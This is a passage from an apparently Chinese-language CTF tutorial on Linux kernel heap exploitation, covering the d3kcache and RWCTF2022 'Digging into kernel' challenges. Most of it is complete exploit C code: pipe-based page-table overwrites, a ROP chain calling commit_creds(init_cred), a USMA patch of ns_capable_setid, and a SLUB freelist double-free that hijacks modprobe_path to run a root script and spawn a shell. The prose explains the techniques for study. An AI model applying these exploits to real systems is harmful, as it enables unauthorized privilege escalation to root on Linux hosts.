arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pud_vaddr), buf);</span><br><span class="line">    <span class="type">size_t</span> pmd_vaddr = ((buf[PUD_ENTRY(vaddr)] &amp; (~<span class="number">0xFFF</span>)) &amp; (~PAGE_NX)) + page_offset_base;</span><br><span class="line">    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pmd_vaddr), buf);</span><br><span class="line">    <span class="type">size_t</span> pte_vaddr = ((buf[PMD_ENTRY(vaddr)] &amp; (~<span class="number">0xFFF</span>)) &amp; (~PAGE_NX)) + page_offset_base;</span><br><span class="line">    arbitrary_read_by_pipe(direct_map_addr_to_page_addr(pte_vaddr), buf);</span><br><span class="line">    buf[PTE_ENTRY(vaddr)] = (paddr &amp; (~<span class="number">0xFFF</span>)) | <span class="number">0x8000000000000867</span>;<span class="comment">/* mark it writable */</span></span><br><span class="line">    arbitrary_write_by_pipe(direct_map_addr_to_page_addr(pte_vaddr), buf, <span class="number">0xff0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *args[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-i&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(args[<span class="number">0</span>], args, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_rop</span><span class="params">()</span> &#123;</span><br><span class="line">    pgd_vaddr_init();</span><br><span class="line">    stack_addr = vaddr_to_paddr_for_4_level(stack_addr) + page_offset_base;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stack addr on direct mapping space: %p\n&quot;</span>, stack_addr);</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">size_t</span> ret = <span class="number">0xffffffff8107af08</span> + kernel_offset;</span><br><span class="line">    <span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff818710dd</span> + kernel_offset;</span><br><span class="line">    <span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF83079EE8</span> + kernel_offset;</span><br><span class="line">    <span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF811284E0</span> + kernel_offset;</span><br><span class="line">    <span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xFFFFFFFF82201A90</span> + kernel_offset;</span><br><span class="line">    <span class="type">size_t</span> *rop = buf;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ((<span class="number">0x1000</span> - <span class="number">0x100</span>) / <span class="number">8</span>); i++) &#123; *rop++ = ret; &#125;</span><br><span class="line">    *rop++ = pop_rdi_ret;</span><br><span class="line">    *rop++ = init_cred;</span><br><span class="line">    *rop++ = commit_creds;</span><br><span class="line">    *rop++ = swapgs_restore_regs_and_return_to_usermode + <span class="number">0x36</span>;</span><br><span class="line">    rop++;</span><br><span class="line">    rop++;</span><br><span class="line">    *rop++ = (<span class="type">size_t</span>) get_shell;</span><br><span class="line">    *rop++ = user_cs;</span><br><span class="line">    *rop++ = user_rflags;</span><br><span class="line">    *rop++ = user_sp;</span><br><span class="line">    *rop++ = user_ss;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking current task&#x27;s stack...&quot;</span>);</span><br><span class="line">    arbitrary_write_by_pipe(direct_map_addr_to_page_addr(stack_addr + <span class="number">0x1000</span> * <span class="number">3</span>), buf, <span class="number">0xff0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_usma</span><span class="params">()</span> &#123;</span><br><span class="line">    pgd_vaddr_init();</span><br><span class="line">    <span class="type">size_t</span> ns_capable_setid_vaddr = <span class="number">0xFFFFFFFF810FD2A0</span> + kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] ns_capable_setid vaddr: %p\n&quot;</span>, ns_capable_setid_vaddr);</span><br><span class="line">    <span class="type">size_t</span> ns_capable_setid_paddr = vaddr_to_paddr_for_3_level(ns_capable_setid_vaddr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] ns_capable_setid vaddr in dir map: %p\n&quot;</span>, ns_capable_setid_paddr + page_offset_base);</span><br><span class="line">    <span class="type">size_t</span> ns_capable_setid_page_paddr = ns_capable_setid_paddr &amp; ~<span class="number">0xFFF</span>;</span><br><span class="line">    <span class="type">char</span> *code_mmap = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(code_mmap, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line">    vaddr_remapping((<span class="type">size_t</span>) code_mmap, ns_capable_setid_page_paddr);</span><br><span class="line">    vaddr_remapping((<span class="type">size_t</span>) code_mmap + <span class="number">0x1000</span>, ns_capable_setid_page_paddr + <span class="number">0x1000</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    byte_dump(<span class="string">&quot;code_mmap&quot;</span>, code_mmap + (ns_capable_setid_paddr &amp; <span class="number">0xFFF</span>), <span class="number">0x100</span>);</span><br><span class="line">    <span class="type">uint8_t</span> shellcode[] = &#123;<span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc0</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xc3</span>&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(code_mmap + (ns_capable_setid_paddr &amp; <span class="number">0xFFF</span>), shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span> &#123;</span><br><span class="line">    bind_core(<span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    kcache_fd = open(<span class="string">&quot;/dev/d3kcache&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (kcache_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open d3kcache.🤔&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    self_write_pipe_init();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>] &amp;&amp; !<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;rop&quot;</span>)) &#123;</span><br><span class="line">        privilege_escalation_by_rop();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (argv[<span class="number">1</span>] &amp;&amp; !<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;usma&quot;</span>)) &#123;</span><br><span class="line">        privilege_escalation_by_usma();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        privilege_escalation_by_task_overwrite();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="arbitrary-address-allocation">Arbitrary Address Allocation</h2>
<p>通过 uaf 修改 object 的 free list 指针实现任意地址分配。与 glibc
不同的是，内核的 slub
堆管理器缺少检查，因此对要分配的目标地址要求不高，不过有一点需要注意：当我们分配到目标地址时会把目标地址前
8 字节的数据会被写入 freelist，而这通常并非一个有效的地址，从而导致
kernel panic，因此在任意地址分配时最好确保目标 object 的 free list
字段为 NULL 。</p>
<p>当能够任意地址分配的时候，与 glibc 改 hook 类似，在内核中通常修改的是
<code>modprobe_path</code> 。<code>modpath_path</code>
是内核中的一个变量，其值为 <code>/sbin/modprobe</code>
，因此对于缺少符号的内核文件可以通过搜索 <code>/sbin/modprobe</code>
字符串的方式定位这个变量。</p>
<p>当我们尝试去执行（execve）一个非法的文件（file magic not
found），内核会经历如下调用链：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">entry_SYSCALL_64()</span><br><span class="line">    sys_execve()</span><br><span class="line">        do_execve()</span><br><span class="line">            do_execveat_common()</span><br><span class="line">                bprm_execve()</span><br><span class="line">                    exec_binprm()</span><br><span class="line">                        search_binary_handler()</span><br><span class="line">                            __request_module() <span class="comment">// wrapped as request_module</span></span><br><span class="line">                                call_modprobe()</span><br></pre></td></tr></table></figure></div>
<p>其中 <code>call_modprobe()</code> 定义于
<code>kernel/kmod.c</code>，我们主要关注这部分代码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">call_modprobe</span><span class="params">(<span class="type">char</span> *module_name, <span class="type">int</span> wait)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	argv[<span class="number">0</span>] = modprobe_path;</span><br><span class="line">	argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">	argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">	argv[<span class="number">3</span>] = module_name;	<span class="comment">/* check free_modprobe_argv() */</span></span><br><span class="line">	argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line">					 <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!info)</span><br><span class="line">		<span class="keyword">goto</span> free_module_name;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);</span><br><span class="line">	<span class="comment">//...</span></span><br></pre></td></tr></table></figure></div>
<p>在这里调用了函数 <code>call_usermodehelper_exec()</code> 将
<code>modprobe_path</code> 作为可执行文件路径以 root 权限将其执行。
我们不难想到的是：若是我们能够劫持
<code>modprobe_path</code>，将其改写为我们指定的恶意脚本的路径，随后我们再执行一个非法文件，内核将会以
root 权限执行我们的恶意脚本。</p>
<h3
id="例题rwctf2022高校赛---digging-into-kernel-1-2">例题：RWCTF2022高校赛
- Digging into kernel 1 &amp; 2</h3>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/linux_kernel_pwn/RWCTF2022%E9%AB%98%E6%A0%A1%E8%B5%9B_Digging_into_kernel_1&amp;2" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
<code>xkmod_init</code> 创建了一个名为 <code>lalala</code> 的
<code>kmem_cache</code> 。分配大小为 192 ，不过由于没有设置
<code>SLAB_ACCOUNT</code> 因此会和 kmalloc-192 合并，这里我们按照
<code>SLAB_ACCOUNT</code> 设置的情况来做。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">xkmod_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rsi</span></span><br><span class="line">  kmem_cache *v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  printk((<span class="type">char</span> *)&amp;byte_1E4, v0);</span><br><span class="line">  misc_register(&amp;xkmod_device);</span><br><span class="line">  v1 = (kmem_cache *)kmem_cache_create(<span class="string">&quot;lalala&quot;</span>, <span class="number">192LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  s = v1;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>xkmod_ioctl</code> 有读，写，分配三个功能，其中分配是从
<code>xkmod_init</code> 创建的 <code>kmem_cache</code> 中分配。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">xkmod_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> op, <span class="type">char</span> *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *p_input; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// rsi</span></span><br><span class="line">  Input input; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    p_input = &amp;input;</span><br><span class="line">    v5 = a3;</span><br><span class="line">    copy_from_user(&amp;input, a3, <span class="number">16LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( op == <span class="number">0x6666666</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      p_input = buf;</span><br><span class="line">      <span class="keyword">if</span> ( buf &amp;&amp; input.size &lt;= <span class="number">0x50</span>u &amp;&amp; input.index &lt;= <span class="number">0x70</span>u )</span><br><span class="line">      &#123;</span><br><span class="line">        copy_from_user(&amp;buf[input.index], input.buf, input.size);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( op != <span class="number">0x7777777</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( op == <span class="number">0x1111111</span> )</span><br><span class="line">          buf = (<span class="type">char</span> *)kmem_cache_alloc(s, <span class="number">0xCC0</span>LL);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v5 = buf;</span><br><span class="line">      <span class="keyword">if</span> ( buf &amp;&amp; input.size &lt;= <span class="number">0x50</span>u &amp;&amp; input.index &lt;= <span class="number">0x70</span>u )</span><br><span class="line">      &#123;</span><br><span class="line">        copy_to_user(input.buf, &amp;buf[input.index], input.size);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xkmod_ioctl_cold((__int64)p_input, (__int64)v5);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>xkmod_release</code> 是驱动自定义的 <code>release</code>
函数，在调用 <code>close</code>
关闭句柄时会调用，显然我们可以关闭多个句柄来实现 double free 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">xkmod_release</span><span class="params">(inode *inode, file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> kmem_cache_free(s, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>关于内核基址获取，在内核“堆基址”（<code>page_offset_base</code>） +
0x9d000 处存放着 <code>secondary_startup_64</code>
函数的地址，而我们可以从 free object 的 next
指针获得一个堆上地址，从而去猜测堆的基址，之后分配到一个 堆基址 +
0x9d000 处的 object 以泄露内核基址，这个地址前面刚好有一片为 NULL
的区域方便我们分配。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __PAGE_OFFSET           page_offset_base</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_OFFSET		((unsigned long)__PAGE_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __va(x)			((void *)((unsigned long)(x)+PAGE_OFFSET))</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Must be perfomed *after* relocation. */</span></span><br><span class="line">	trampoline_header = (<span class="keyword">struct</span> trampoline_header *)</span><br><span class="line">		__va(real_mode_header-&gt;trampoline_header);</span><br><span class="line">	...</span><br><span class="line">	trampoline_header-&gt;start = (u64) secondary_startup_64;</span><br></pre></td></tr></table></figure></div>
<p>至于 <code>page_offset_base</code> 可以通过 object 上的 free list
泄露的堆地址与上 0xFFFFFFFFF0000000 获取。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xFFFFFFFF82444700</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qword_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Data</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> *buf;</span><br><span class="line">    <span class="type">u_int32_t</span> offset;</span><br><span class="line">    <span class="type">u_int32_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc_buf</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> Data *data)</span> &#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x1111111</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_buf</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> Data *data)</span> &#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6666666</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_buf</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> Data *data)</span> &#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x7777777</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> xkmod_fd[<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        xkmod_fd[i] = open(<span class="string">&quot;/dev/xkmod&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (xkmod_fd[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] %d Failed to open xkmod.&quot;</span>, i);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Data</span> <span class="title">data</span> =</span> &#123;<span class="built_in">malloc</span>(<span class="number">0x1000</span>), <span class="number">0</span>, <span class="number">0x50</span>&#125;;</span><br><span class="line">    alloc_buf(xkmod_fd[<span class="number">0</span>], &amp;data);</span><br><span class="line">    close(xkmod_fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    read_buf(xkmod_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    qword_dump(<span class="string">&quot;buf&quot;</span>, data.buf, <span class="number">0x50</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> page_offset_base = data.buf[<span class="number">0</span>] &amp; <span class="number">0xFFFFFFFFF0000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] page_offset_base: %p\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line">    data.buf[<span class="number">0</span>] = page_offset_base + <span class="number">0x9d000</span> - <span class="number">0x10</span>;</span><br><span class="line">    write_buf(xkmod_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    alloc_buf(xkmod_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    alloc_buf(xkmod_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line"></span><br><span class="line">    data.size = <span class="number">0x50</span>;</span><br><span class="line">    read_buf(xkmod_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    qword_dump(<span class="string">&quot;buf&quot;</span>, data.buf, <span class="number">0x50</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> kernel_offset = data.buf[<span class="number">2</span>] - <span class="number">0xffffffff81000030</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line"></span><br><span class="line">    close(xkmod_fd[<span class="number">1</span>]);</span><br><span class="line">    data.buf[<span class="number">0</span>] = modprobe_path - <span class="number">0x10</span>;</span><br><span class="line">    write_buf(xkmod_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line">    alloc_buf(xkmod_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line">    alloc_buf(xkmod_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *) &amp;data.buf[<span class="number">2</span>], <span class="string">&quot;/home/shell.sh&quot;</span>);</span><br><span class="line">    write_buf(xkmod_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (open(<span class="string">&quot;/home/shell.sh&quot;</span>, O_RDWR) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        system(<span class="string">&quot;echo &#x27;#!/bin/sh&#x27; &gt;&gt; /home/shell.sh&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;echo &#x27;chmod 777 /flag&#x27; &gt;&gt; /home/shell.sh&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;chmod +x /home/shell.sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/home/fake&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (open(<span class="string">&quot;/flag&quot;</span>, O_RDWR) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to hijack!&quot;</span>);</span><br><span class="line">        _exit(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] hijack success&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="arbitrary-address-freeonly-heap-address">Arbitrary Address
Free（Only Heap Address）</h2>
<p>在内核利用的时候有时想通过修改一个 A 结构体的某个指针指向 B
结构体然后释放 A 结构体来释放 B 结构体从而实现 B 结构体的 UAF
。然而有时候劫持 B 结构体进行 UAF 的 C 结构体改不到 B
结构体的关键字段，这时后可以考虑把 A 结构体的指针改到 B
结构体地址减某个偏移的地方，这样 C 结构体的可控部分能够覆盖 B
结构体需修改的区域。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/ae28b507f16bb57197a305beee3c64f9.png"
                     
alt="在这里插入图片描述" 
                > 分析 <code>kfree</code> 源码可知
<code>kmem_cache</code> 是通过 object 所在 <code>page</code> 获取的。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">kfree</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *x)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="type">void</span> *object = (<span class="type">void</span> *)x;</span><br><span class="line"></span><br><span class="line">	trace_kfree(_RET_IP_, x);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(x)))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	page = virt_to_head_page(x);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!PageSlab(page))) &#123;</span><br><span class="line">		BUG_ON(!PageCompound(page));</span><br><span class="line">		kfree_hook(object);</span><br><span class="line">		__free_pages(page, compound_order(page));</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	slab_free(page-&gt;slab_cache, page, object, <span class="literal">NULL</span>, <span class="number">1</span>, _RET_IP_);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 之后又如下调用链： <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kfree()</span><br><span class="line">    slab_free()</span><br><span class="line">        do_slab_free()</span><br></pre></td></tr></table></figure></div> 在
<code>do_slab_free</code> 中几乎没做检查，直接将该 object 链入到
<code>freelist</code> 上。因此可以进行堆上任意地址 free 。
